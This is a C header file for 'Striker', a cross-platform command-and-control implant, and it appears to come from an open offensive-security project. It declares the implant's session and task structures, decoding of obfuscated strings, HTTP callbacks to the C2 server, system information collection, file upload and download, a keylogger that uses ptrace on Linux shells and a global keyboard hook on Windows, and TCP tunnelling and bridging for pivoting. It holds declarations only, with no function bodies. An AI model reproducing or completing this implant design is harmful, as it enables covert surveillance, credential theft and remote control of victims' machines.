/**
 *--------------------------------------------------------------------
 * Header file for the Striker C2 implant for linux and windows hosts.
 *                                                  Author: Umar Abdul
 *--------------------------------------------------------------------
 */

#ifndef STRIKER_H
#define STRIKER_H

#ifdef __WIN32__
  #define IS_WINDOWS
  #define WIN32_LEAN_AND_MEAN
  #include <windows.h>
  #include <wininet.h>
  #include <winsock2.h>
  #include <ws2tcpip.h>
#else
  #define IS_LINUX
#endif

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/stat.h>
#include "cJSON.h"
#include "striker_utils.h"

#ifdef IS_LINUX
  #include <sys/user.h>
  #include <sys/wait.h>
  #include <sys/ptrace.h>
  #include <pthread.h>
  #include <curl/curl.h>
  #include <sys/select.h>
  #include <linux/input.h>
  #include <netdb.h>
  #include <arpa/inet.h>
  #include <sys/socket.h>
#endif

// A struct for tracking session info.
typedef struct{
  char *uid; // The ID of the agent.
  char *auth_key; // The key to use for authentication to the server.
  unsigned long delay; // Callback delay, in seconds.
  char *write_dir; // Full path to a writable directory.
  unsigned short abort; // Will be set to 1 if session need to be ended.
  queue *tasks; // Running tasks.
} session;

// A struct for representing a single task.
typedef struct{
  char *uid; // The ID of the task
  char *type; // The type of the task
  cJSON *data; // The data needed by the task
  unsigned short completed; // Indicates if the task has been completed.
  unsigned short successful; // Indicates if the task was successfully completed.
  unsigned short abort; // For long-running tasks. Indicates if they should abort.
  cJSON *result; // The result of the task.
  cJSON *input_json; // The cJSON object used to generate the task.
} task;

// A struct for passing session and task to task executor.
typedef struct{
  session *striker;
  task *tsk;
} task_wrapper;


// For decoding obfuscated strings.
char *obfs_decode(char *str);

// Generate a random alphanumeric string.
char *random_str(size_t len);

// Used for parsing URL.
typedef enum {HTTP, HTTPS} URL_PROTO;

// Extract the protocol, hostname, port, and path of a URL.
void parse_url(char *url, URL_PROTO *proto, char *host, int *port, char *path);

// Get the basename of a file path string.
char *get_basename(char *path);

/**
 * Make a GET request to `url`, save response body to `body`, and return the status code.
 * If `url` starts with a "/", it will be treated as a relative path to the active C2 server.
 */
int http_get(char *url, buffer *body);

// Same as above, but for POST requests. `data` is the POST data (JSON), and response will be written to `body` 
int http_post(char *url, cJSON *data, buffer *body);

#ifdef IS_LINUX
  /**
   * Callback function for curl to receive response body inside a buffer.
   * This may be called multiple times with chunks of data, depending on the size of the body.
   */
  size_t body_receiver(void *chunk, size_t size, size_t nmemb, buffer *buff);

  // Callback function for curl to write response body to a file.
  size_t body_downloader(void *chunk, size_t size, size_t nmemb, FILE *wfo);
#endif

// Extract the host and port in a URL.
void get_url_host_port(char *url, char *host, int *port);

// Return a json object containing system information.
cJSON *sysinfo();

// Handles task for uploading file to server. Returns 0 on success.
short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff);

// Download a file from `url` and save to `wfo`. Returns 0 on success.
short int download_file(char *url, FILE *wfo, buffer *result_buff);

// Starts the keylogger
void keymon(session *striker, task *tsk);

#ifdef IS_LINUX
  // Monitors processes and call keymon_proc_attach() to have the keylogged.
  void *keymon_proc_watch(void *ptr);
  // Called by keymon in bg thread for every shell process to be tapped.
  void *keymon_proc_attach(void *ptr);
#else
  // Creates a global keyboard hook for keymon.
  DWORD WINAPI keymon_create_hook(LPVOID ptr);
  // The hook procedure.
  LRESULT CALLBACK keymon_hook_proc(int nCode, WPARAM wParam, LPARAM lParam);
#endif

// Connect to a TCP sockect and return the socket object.
#ifdef IS_LINUX
  int tcp_connect(char *host, int port);
#else
  SOCKET tcp_connect(char *host, int port);
#endif

// Starts a TCP tunnel server.
int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost, int rport);

#ifdef IS_LINUX
  // Create a TCP tunnel for a new connection.
  void *tcp_tunnel_route(void *ptr);
#endif

// Create a TCP bridge between two servers
void tcp_bridge(session *striker, task *tsk, char *host1, int port1, char *host2, int port2);

// Parse a task JSON and return it, NULL on error.
task *parse_task(cJSON *json);

// Free a task.
void free_task(task *tsk);

// Wrapper for starting a thread to execute a task.
#ifdef IS_LINUX
  void *task_executor(void *ptr);
#else
  DWORD WINAPI task_executor(LPVOID ptr);
#endif

// Starts the implant.
void start_session();

// Cleanup session. Called on exit.
void cleanup_session(session *striker);

#endif // STRIKER_H
